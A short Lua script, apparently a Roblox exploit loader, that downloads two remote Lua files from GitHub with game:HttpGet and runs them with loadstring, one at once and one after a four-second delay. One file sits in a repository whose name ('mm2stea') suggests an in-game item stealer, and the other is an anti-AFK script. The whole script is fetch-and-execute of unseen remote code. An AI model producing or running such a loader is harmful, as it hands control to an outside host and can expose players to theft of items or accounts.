local function daddy()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Johnnyissocoollol/mm2stea/refs/heads/main/ajm2.lua'))()
end

local function omg()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Johnnyissocoollol/halloween/refs/heads/main/antiafk.lua'))()
end

task.spawn(daddy)

task.delay(4, function()
    task.spawn(omg)
end)
